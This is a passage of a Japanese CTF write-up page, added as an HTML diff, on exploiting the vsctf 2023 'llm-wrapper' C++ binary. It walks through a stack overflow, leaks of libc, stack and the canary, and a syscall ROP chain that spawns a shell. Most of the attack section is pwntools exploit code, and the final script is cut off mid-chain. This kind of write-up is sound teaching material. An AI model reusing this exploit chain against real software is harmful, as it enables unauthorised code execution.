@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="ja">
+
+<head>
+    <title>vsctf 2023 | llm-wrapper | House-of-Rona</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <meta name="robots" content="noodp"/>
+
+    <link rel="stylesheet" href="https://blog.rqda.wtf/style.css">
+    <link rel="stylesheet" href="https://blog.rqda.wtf/color/green-auto.css">
+
+        <link rel="stylesheet" href="https://blog.rqda.wtf/color/background_dark.css">
+    
+    <link rel="stylesheet" href="https://blog.rqda.wtf/font-hack-subset.css">
+
+        <link rel="shortcut icon" type="image/png" href="/images/favicon.png">
+    
+<link rel="stylesheet" href="https://blog.rqda.wtf/footnote.css">
+<link rel="stylesheet" href="https://blog.rqda.wtf/page.css">
+<link rel="stylesheet" href="https://www.nerdfonts.com/assets/css/webfont.css">
+
+<meta name="google-site-verification" content="I4O4hRvGX4CkU3wvuZTczjjZFLuG3YINxBvx2be_tHY">
+<link rel="stylesheet" href="https://blog.rqda.wtf/icon.css">
+
+<meta property="og:title" content="vsctf 2023 | llm-wrapper | House-of-Rona">
+<meta property="og:image" content="https://github.com/rqdaA.png">
+<meta name="twitter:site" content="@907903">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="vsctf 2023 | llm-wrapper | House-of-Rona">
+<meta name="twitter:image" content="https://github.com/rqdaA.png">
+<meta property="author" content="Rona (rqdaA)">
+<meta property="description" content="ノーソースC++問への怒り">
+<meta property="og:description" content="ノーソースC++問への怒り">
+
+
+</head>
+
+<body class="">
+<div class="container">
+    
+<header class="header">
+    <div class="header__inner">
+        <div class="header__logo">
+            
+            <img src="https://github.com/rqdaA.png" alt="">
+            
+            
+            <a href="https://blog.rqda.wtf" style="text-decoration: none;">
+                <div class="logo">
+                    
+                    House-of-Rona
+                    
+                </div>
+            </a>
+        </div>
+    </div>
+
+    
+    <nav class="menu">
+            <ul class="menu__inner">
+                <li><a href="https://blog.rqda.wtf/tags"><i class='nf nf-oct-tag'></i>tags</a></li>
+            
+                <li><a href="https://blog.rqda.wtf/about"><i class='nf nf-dev-github_alt'></i>whoami</a></li>
+            
+                <li><a href="https://github.com/rqdaA" target="_blank" rel="noopener noreferrer"><i class='nf nf-cod-github_inverted'></i>github</a></li>
+            
+                <li><a href="https://twitter.com/907903" target="_blank" rel="noopener noreferrer"><i class='nf nf-cod-twitter'></i>twitter</a></li>
+            </ul>
+        </nav>
+    
+    
+    
+</header>
+
+
+    <div class="content">
+        
+<div class="post">
+    
+    <h1 class="post-title"><a href="https://blog.rqda.wtf/vsctf-2023/">vsctf 2023 | llm-wrapper</a></h1>
+    <div class="post-meta-inline">
+        
+    <span class="post-date">
+            2023-09-29
+        </span>
+
+    </div>
+
+    
+        <span class="post-tags-inline">
+                :: tags:&nbsp;
+                <a class="post-tag" href="https://blog.rqda.wtf/tags/c/">#C++</a>&nbsp;
+                <a class="post-tag" href="https://blog.rqda.wtf/tags/pwn/">#pwn</a>&nbsp;
+                <a class="post-tag" href="https://blog.rqda.wtf/tags/rop/">#rop</a></span>
+    
+
+    
+    <h1>Table of Content</h1>
+    <ul>
+        
+        <li>
+            <a href="https://blog.rqda.wtf/vsctf-2023/#llm-wrapper">llm-wrapper</a>
+            
+            <ul>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/vsctf-2023/#fen-xi">分析</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/vsctf-2023/#cui-ruo-xing">脆弱性</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/vsctf-2023/#gong-ji">攻撃</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/vsctf-2023/#sukuriputo">スクリプト</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/vsctf-2023/#zhong-warini">終わりに</a>
+                </li>
+                
+            </ul>
+            
+        </li>
+        
+    </ul>
+    <hr>
+    
+
+    
+        <div class="post-content">
+            <p>C++の問題が解きたかったので、<a href="https://ctftime.org/event/2053">vsctf</a>のllm-wrapperを解きました。</p>
+<span id="continue-reading"></span><h1 id="llm-wrapper">llm-wrapper</h1>
+<h2 id="fen-xi">分析</h2>
+<p>APIトークンとプロンプトを指定してllmと会話ができるバイナリが渡されます。(
+実際は用意された文字列をランダムに表示しているだけですが。) C++のバイナリなのにソースコードがついていなくて泣いていました。</p>
+<p>セキュリティ機構は以下のとおりです。</p>
+<ul>
+<li>FULL RELRO</li>
+<li>Canaryあり</li>
+<li>NX</li>
+<li>PIE無効</li>
+</ul>
+<p>このバイナリの機能としては、最初にAPIトークンの初期化をし、その後</p>
+<ol>
+<li>プロンプトの実行</li>
+<li>プロンプトの変更</li>
+<li>終了</li>
+</ol>
+<p>のいずれかを行うことができます。</p>
+<h2 id="cui-ruo-xing">脆弱性</h2>
+<p>プロンプトの変更にわかりやすく脆弱性があります。
+はじめに<code>ABCD</code>を入力し次に<code>ab</code>を入力するとプロンプトは<code>abCD</code>となります。</p>
+<p>このへんの処理を詳しく見るために、<code>LLM::update_prompt()</code>の処理を覗いてみます。
+<code>LLM::get_prompt[abi:cxx11]()</code>で取ってきたStringのポインタに対して改行が入力されるまでコピーを繰り返しているようです。</p>
+<p>ということはインライン化されたStringを持ってくるとStack Overflowができそうだとわかります。
+C++の構造体の中身についてはptr-yudai氏<sup class="footnote-reference"><a href="#1">1</a></sup>の
+<a href="https://ptr-yudai.hatenablog.com/entry/2021/11/30/235732#stdstring">こちら</a>
+の記事を参照してください。</p>
+<p>実際に以下のように実行するとBoFが起こることが確認できます。</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#bf616a;">update</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">abc</span><span>&#39;)
+</span><span style="color:#bf616a;">update</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39;*</span><span style="color:#d08770;">0x100</span><span>)
+</span><span style="color:#bf616a;">fin</span><span>()
+</span></code></pre>
+
+<div class="inserted_img">
+    <img src="https:&#x2F;&#x2F;blog.rqda.wtf&#x2F;processed_images&#x2F;img_1.204c53d238ac3c06.png" alt=""/>
+    <p>BoF発生後のstack</p></div>
+<p>さて、BoFを起こすことができましたが、canaryはオンになっています。
+これをリークすることができればROPで任意コード実行に持っていけそうです。</p>
+<p>これは難しくなく<sup class="footnote-reference"><a href="#2">2</a></sup>、BoFを起こすことができたStringのすぐ下にAPIトークンを持つstringが格納されています。
+プロンプトの実行を行うことでAPIトークンを出力させることができるため、
+APIトークンのstringが持つポインタを書き換えてしまえばAARが可能になります。</p>
+<p>実際に以下のようなコードを実行すると<code>getchar</code>のアドレスが出力されていることが確認できます。</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#bf616a;">update</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">abc</span><span>&#39;)
+</span><span style="color:#bf616a;">update</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39;*</span><span style="color:#d08770;">0x10 </span><span>+ </span><span style="color:#bf616a;">p64</span><span>(elf.</span><span style="color:#bf616a;">got</span><span>(&#39;</span><span style="color:#a3be8c;">getchar</span><span>&#39;)) + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">8</span><span>))
+</span><span style="color:#bf616a;">run</span><span>()
+</span></code></pre>
+
+<div class="inserted_img">
+    <img src="https:&#x2F;&#x2F;blog.rqda.wtf&#x2F;processed_images&#x2F;img.dabc933e99403e36.png" alt=""/>
+    <p>leakの発生</p></div>
+<h2 id="gong-ji">攻撃</h2>
+<p>以下の手順で任意コード実行まで持っていくことができそうです。</p>
+<ol>
+<li>libcのleak</li>
+<li>environを用いたstackのleak</li>
+<li>canaryのleak</li>
+<li>ROP</li>
+</ol>
+<p>まずはヘルパ関数を定義します。</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">run</span><span>() -&gt; bytes:
+</span><span>        </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">choice: </span><span>&quot;, </span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#d08770;">1</span><span>))
+</span><span>        </span><span style="color:#b48ead;">return </span><span>t.</span><span style="color:#bf616a;">recvuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">1. Run</span><span>&quot;)
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">update</span><span>(</span><span style="color:#bf616a;">msg</span><span>: bytes):
+</span><span>        </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">choice: </span><span>&quot;, </span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#d08770;">2</span><span>))
+</span><span>        </span><span style="color:#bf616a;">sa</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">ask me?</span><span>&quot;, msg)
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">fin</span><span>():
+</span><span>        </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">choice: </span><span>&quot;, </span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#d08770;">3</span><span>))
+</span></code></pre>
+<h3 id="libcnoleak">libcのleak</h3>
+<p>PIEが無効なので、上記のようにAPIトークンのポインタをGOTテーブルにしてあげるとlibcのleakができます。</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span>    </span><span style="color:#bf616a;">update</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">ABCD</span><span style="color:#96b5b4;">\n</span><span>&quot;)
+</span><span>    </span><span style="color:#bf616a;">update</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">A</span><span>&quot; * </span><span style="color:#d08770;">0x10 </span><span>+ </span><span style="color:#bf616a;">p64</span><span>(elf.got[&quot;</span><span style="color:#a3be8c;">getchar</span><span>&quot;]) + </span><span style="color:#bf616a;">p8</span><span>(</span><span style="color:#d08770;">8</span><span>) + </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\n</span><span>&quot;)
+</span><span>    buf = </span><span style="color:#bf616a;">run</span><span>()
+</span><span>    </span><span style="color:#bf616a;">info</span><span>(buf)
+</span><span>    t.</span><span style="color:#bf616a;">interactive</span><span>()
+</span><span>    buf = buf[buf.</span><span style="color:#bf616a;">find</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">with token </span><span>&quot;) + </span><span style="color:#d08770;">12 </span><span>:][:</span><span style="color:#d08770;">8</span><span>]
+</span><span>    </span><span style="color:#bf616a;">info</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;{buf</span><span style="color:#b48ead;">=</span><span style="color:#d08770;">:</span><span>}&quot;)
+</span><span>    libc_base = </span><span style="color:#bf616a;">s2u64</span><span>(buf) - </span><span style="color:#d08770;">0x87B60
+</span><span>    </span><span style="color:#bf616a;">success</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;{libc_base</span><span style="color:#b48ead;">=</span><span style="color:#d08770;">:x</span><span>}&quot;)
+</span></code></pre>
+<h3 id="stacknoleak">stackのleak</h3>
+<p>libcがleakできているのでAPIトークンのポインタをenvironにしてあげるとstackのleakができます。</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span>    environ = libc_base + </span><span style="color:#d08770;">0x221200
+</span><span>
+</span><span>    </span><span style="color:#bf616a;">update</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">A</span><span>&quot; * </span><span style="color:#d08770;">0x10 </span><span>+ </span><span style="color:#bf616a;">p64</span><span>(environ) + </span><span style="color:#bf616a;">p8</span><span>(</span><span style="color:#d08770;">8</span><span>) + </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\n</span><span>&quot;)
+</span><span>    buf = </span><span style="color:#bf616a;">run</span><span>()
+</span><span>    buf = buf[buf.</span><span style="color:#bf616a;">find</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">with token </span><span>&quot;) + </span><span style="color:#d08770;">12 </span><span>:][:</span><span style="color:#d08770;">8</span><span>]
+</span><span>    stack_base = </span><span style="color:#bf616a;">s2u64</span><span>(buf)
+</span><span>    </span><span style="color:#bf616a;">success</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;{stack_base</span><span style="color:#b48ead;">=</span><span style="color:#d08770;">:x</span><span>}&quot;)
+</span></code></pre>
+<h3 id="canarynoleak">canaryのleak</h3>
+<p>leakしたstackからのオフセットを計算するとcanaryもleakできます。</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span>    canary_addr = stack_base - </span><span style="color:#d08770;">0x190
+</span><span>    </span><span style="color:#bf616a;">info</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;{canary_addr</span><span style="color:#b48ead;">=</span><span style="color:#d08770;">:x</span><span>}&quot;)
+</span><span>    </span><span style="color:#bf616a;">update</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">AAAAAAAA</span><span>&quot; + </span><span style="color:#bf616a;">p64</span><span>(wriable_area) + </span><span style="color:#bf616a;">p64</span><span>(canary_addr) + </span><span style="color:#bf616a;">p8</span><span>(</span><span style="color:#d08770;">8</span><span>) + </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\n</span><span>&quot;)
+</span><span>    buf = </span><span style="color:#bf616a;">run</span><span>()
+</span><span>    buf = buf[buf.</span><span style="color:#bf616a;">find</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">with token </span><span>&quot;) + </span><span style="color:#d08770;">12 </span><span>:][:</span><span style="color:#d08770;">8</span><span>]
+</span><span>    canary = </span><span style="color:#bf616a;">s2u64</span><span>(buf)
+</span><span>    </span><span style="color:#bf616a;">success</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;{canary</span><span style="color:#b48ead;">=</span><span style="color:#d08770;">:x</span><span>}&quot;)
+</span></code></pre>
+<h3 id="rop">ROP</h3>
+<p>最後にROPを組めば任意コード実行に持ち込めます。
+今回はstackを飛ばす先を考えるのが面倒だったので<code>system</code>ではなく<code>syscall</code>を使ったROPにしています。</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span>    bin_sh = libc_base + </span><span style="color:#d08770;">0x1D8698
+</span><span>    pop_rdi = libc_base + </span><span style="color:#d08770;">0x172B79
+</span><span>    pop_rsi = libc_base + </span><span style="color:#d08770;">0x173CF0
+</span><span>    pop_rax = libc_base + </span><span style="color:#d08770;">0xD9AE2
+</span><span>    pop_rdx_rbx = libc_base + </span><span style="color:#d08770;">0x174F96
+</span><span>    syscall = libc_base + </span><span style="color:#d08770;">0x128ACA
+</span><span>    rbp = </span><span style="color:#d08770;">0
+</span><span>    rop = (
+</span><span>        </span><span style="color:#bf616a;">p64</span><span>(pop_rdi)
+</span><span>        + </span><span style="color:#bf616a;">p64</span><span>(bin_sh)
+</span><span>        + </span><span style="color:#bf616a;">p64</span><span>(pop_rsi)
+</span><span>        + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>)
+</span><span>        + </span><span style="color:#bf616a;">p64</span><span>(pop_rdx_rbx)
+</span><span>        + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>)
+</span><span>        + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>)
+</span><span>        + </span><span style="color:#bf616a;">p64</span><span>(pop_rax)
+</span><span>        + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">59</span><span>)
+</span><span>        + </span><span style="color:#bf616a;">p64</span><span>(syscall)
+</span><span>    )
+</span><span>    </span><span style="color:#bf616a;">update</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x00</span><span>&quot; * </span><span style="color:#d08770;">0x38 </span><span>+ </span><span style="color:#bf616a;">p64</span><span>(canary) + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>) * </span><span style="color:#d08770;">2 </span><span>+ </span><span style="color:#bf616a;">p64</span><span>(rbp) + rop + </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\n</span><span>&quot;)
+</span><span>
+</span><span>    </span><span style="color:#bf616a;">fin</span><span>()
+</span></code></pre>
+
+<div class="inserted_img">
+    <img src="https:&#x2F;&#x2F;blog.rqda.wtf&#x2F;processed_images&#x2F;img_2.aa99a8dec84798ed.png" alt=""/>
+    <p>🎉</p></div>
+<h2 id="sukuriputo">スクリプト</h2>
+<p>最終的なスクリプトが以下です。</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>context.arch = &quot;</span><span style="color:#a3be8c;">amd64</span><span>&quot;
+</span><span>context.bits = </span><span style="color:#d08770;">64
+</span><span>context.terminal = &quot;</span><span style="color:#a3be8c;">tmux splitw -h</span><span>&quot;.</span><span style="color:#bf616a;">split</span><span>()
+</span><span>context.log_level = &quot;</span><span style="color:#a3be8c;">DEBUG</span><span>&quot;
+</span><span>
+</span><span>s2sh = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">pl</span><span>: </span><span style="color:#b48ead;">b</span><span>&quot;&quot;.</span><span style="color:#bf616a;">join</span><span>([</span><span style="color:#bf616a;">p8</span><span>(</span><span style="color:#bf616a;">int</span><span>(pl[i : i + </span><span style="color:#d08770;">2</span><span>], </span><span style="color:#d08770;">16</span><span>)) </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#96b5b4;">len</span><span>(pl), </span><span style="color:#d08770;">2</span><span>)])
+</span><span>s2u64 = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">s</span><span>: </span><span style="color:#bf616a;">u64</span><span>(s.</span><span style="color:#bf616a;">ljust</span><span>(</span><span style="color:#d08770;">8</span><span>, </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x00</span><span>&quot;))
+</span><span>i2b = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>: </span><span style="color:#b48ead;">f</span><span>&quot;{x}&quot;.</span><span style="color:#bf616a;">encode</span><span>()
+</span><span>ptr_guard = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">pos</span><span>, </span><span style="color:#bf616a;">ptr</span><span>: (pos &gt;&gt; </span><span style="color:#d08770;">12</span><span>) ^ ptr
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">create_io</span><span>() -&gt; tubes.tube.tube:
+</span><span>    </span><span style="color:#b48ead;">if </span><span>not local:
+</span><span>        io: tubes.tube.tube = </span><span style="color:#bf616a;">remote</span><span>(remote_addr, </span><span style="color:#bf616a;">int</span><span>(remote_port))
+</span><span>    </span><span style="color:#b48ead;">elif </span><span>debug:
+</span><span>        </span><span style="color:#b48ead;">if </span><span>radare:
+</span><span>            io: tubes.tube.tube = </span><span style="color:#bf616a;">process</span><span>(elf_name, </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_LIBRARY_PATH</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">.</span><span>&quot;})
+</span><span>            util.proc.</span><span style="color:#bf616a;">wait_for_debugger</span><span>(util.proc.</span><span style="color:#bf616a;">pidof</span><span>(io)[</span><span style="color:#d08770;">0</span><span>])
+</span><span>        </span><span style="color:#b48ead;">else</span><span>:
+</span><span>            io: tubes.tube.tube = gdb.</span><span style="color:#bf616a;">debug</span><span>(
+</span><span>                elf_name, script, </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_LIBRARY_PATH</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">.</span><span>&quot;}
+</span><span>            )
+</span><span>    </span><span style="color:#b48ead;">else</span><span>:
+</span><span>        io: tubes.tube.tube = </span><span style="color:#bf616a;">process</span><span>(elf_name, </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_LIBRARY_PATH</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">.</span><span>&quot;})
+</span><span>    </span><span style="color:#b48ead;">return </span><span>io
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">solve</span><span>():
+</span><span>    </span><span style="color:#b48ead;">global </span><span>t
+</span><span>    sa = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>, </span><span style="color:#bf616a;">y</span><span>: t.</span><span style="color:#bf616a;">sendafter</span><span>(x, y)
+</span><span>    sla = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>, </span><span style="color:#bf616a;">y</span><span>: t.</span><span style="color:#bf616a;">sendlineafter</span><span>(x, y)
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">run</span><span>() -&gt; bytes:
+</span><span>        </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">choice: </span><span>&quot;, </span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#d08770;">1</span><span>))
+</span><span>        </span><span style="color:#b48ead;">return </span><span>t.</span><span style="color:#bf616a;">recvuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">1. Run</span><span>&quot;)
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">update</span><span>(</span><span style="color:#bf616a;">msg</span><span>: bytes):
+</span><span>        </span><span style="color:#b48ead;">if b</span><span>&quot;</span><span style="color:#96b5b4;">\a</span><span>&quot; in msg:
+</span><span>            </span><span style="color:#b48ead;">raise </span><span style="color:#bf616a;">Exception</span><span>(&quot;</span><span style="color:#a3be8c;">Invalid bytes</span><span>&quot;)
+</span><span>        </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">choice: </span><span>&quot;, </span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#d08770;">2</span><span>))
+</span><span>        </span><span style="color:#bf616a;">sa</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">ask me?</span><span>&quot;, msg)
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">fin</span><span>():
+</span><span>        </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">choice: </span><span>&quot;, </span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#d08770;">3</span><span>))
+</span><span>
+</span><span>    gen = </span><span style="color:#bf616a;">cyclic_gen</span><span>()
+</span><span>    </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">: </span><span>&quot;, gen.</span><span style="color:#bf616a;">get</span><span>(</span><span style="color:#d08770;">8</span><span>))
+</span><span>    wriable_area = </span><span style="color:#d08770;">0x4082E0
+</span><span>
+</span><span>    </span><span style="color:#bf616a;">update</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">ABCD</span><span style="color:#96b5b4;">\n</span><span>&quot;)
+</span><span>    </span><span style="color:#bf616a;">update</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">A</span><span>&quot; * </span><span style="color:#d08770;">0x10 </span><span>+ </span><span style="color:#bf616a;">p64</span><span>(elf.got[&quot;</span><span style="color:#a3be8c;">getchar</span><span>&quot;]) + </span><span style="color:#bf616a;">p8</span><span>(</span><span style="color:#d08770;">8</span><span>) + </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\n</span><span>&quot;)
+</span><span>    buf = </span><span style="color:#bf616a;">run</span><span>()
+</span><span>    </span><span style="color:#bf616a;">info</span><span>(buf)
+</span><span>    buf = buf[buf.</span><span style="color:#bf616a;">find</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">with token </span><span>&quot;) + </span><span style="color:#d08770;">12 </span><span>:][:</span><span style="color:#d08770;">8</span><span>]
+</span><span>    </span><span style="color:#bf616a;">info</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;{buf</span><span style="color:#b48ead;">=</span><span style="color:#d08770;">:</span><span>}&quot;)
+</span><span>    libc_base = </span><span style="color:#bf616a;">s2u64</span><span>(buf) - </span><span style="color:#d08770;">0x87B60
+</span><span>    </span><span style="color:#bf616a;">success</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;{libc_base</span><span style="color:#b48ead;">=</span><span style="color:#d08770;">:x</span><span>}&quot;)
+</span><span>    </span><span style="color:#b48ead;">assert </span><span>not libc_base &amp; </span><span style="color:#d08770;">0xFFF
+</span><span>
+</span><span>    environ = libc_base + </span><span style="color:#d08770;">0x221200
+</span><span>
+</span><span>    </span><span style="color:#bf616a;">update</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">A</span><span>&quot; * </span><span style="color:#d08770;">0x10 </span><span>+ </span><span style="color:#bf616a;">p64</span><span>(environ) + </span><span style="color:#bf616a;">p8</span><span>(</span><span style="color:#d08770;">8</span><span>) + </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\n</span><span>&quot;)
+</span><span>    buf = </span><span style="color:#bf616a;">run</span><span>()
+</span><span>    buf = buf[buf.</span><span style="color:#bf616a;">find</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">with token </span><span>&quot;) + </span><span style="color:#d08770;">12 </span><span>:][:</span><span style="color:#d08770;">8</span><span>]
+</span><span>    stack_base = </span><span style="color:#bf616a;">s2u64</span><span>(buf)
+</span><span>    </span><span style="color:#bf616a;">success</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;{stack_base</span><span style="color:#b48ead;">=</span><span style="color:#d08770;">:x</span><span>}&quot;)
+</span><span>
+</span><span>    canary_addr = stack_base - </span><span style="color:#d08770;">0x190
+</span><span>    </span><span style="color:#bf616a;">info</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;{canary_addr</span><span style="color:#b48ead;">=</span><span style="color:#d08770;">:x</span><span>}&quot;)
+</span><span>    </span><span style="color:#bf616a;">update</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">AAAAAAAA</span><span>&quot; + </span><span style="color:#bf616a;">p64</span><span>(wriable_area) + </span><span style="color:#bf616a;">p64</span><span>(canary_addr) + </span><span style="color:#bf616a;">p8</span><span>(</span><span style="color:#d08770;">8</span><span>) + </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\n</span><span>&quot;)
+</span><span>    buf = </span><span style="color:#bf616a;">run</span><span>()
+</span><span>    buf = buf[buf.</span><span style="color:#bf616a;">find</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">with token </span><span>&quot;) + </span><span style="color:#d08770;">12 </span><span>:][:</span><span style="color:#d08770;">8</span><span>]
+</span><span>    canary = </span><span style="color:#bf616a;">s2u64</span><span>(buf)
+</span><span>    </span><span style="color:#bf616a;">success</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;{canary</span><span style="color:#b48ead;">=</span><span style="color:#d08770;">:x</span><span>}&quot;)
+</span><span>
+</span><span>    bin_sh = libc_base + </span><span style="color:#d08770;">0x1D8698
+</span><span>    pop_rdi = libc_base + </span><span style="color:#d08770;">0x172B79
+</span><span>    pop_rsi = libc_base + </span><span style="color:#d08770;">0x173CF0
+</span><span>    pop_rax = libc_base + </span><span style="color:#d08770;">0xD9AE2
+</span><span>    pop_rdx_rbx = libc_base + </span><span style="color:#d08770;">0x174F96
+</span><span>    syscall = libc_base + </span><span style="color:#d08770;">0x128ACA
+</span><span>    rbp = </span><span style="color:#d08770;">0
+</span><span>    rop = (
+</span><span>        </span><span style="color:#bf616a;">p64</span><span>(pop_rdi)
+</span><span>        + </span><span style="color:#bf616a;">p64</span><span>(bin_sh)
+</span><span>        + </span><span style="color:#bf616a;">p64</span><span>(pop_rsi)
+</span><span>        + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>)
+</span><span>        + </span><span style="color:#bf616a;">p64</span><span>(pop_rdx_rbx)
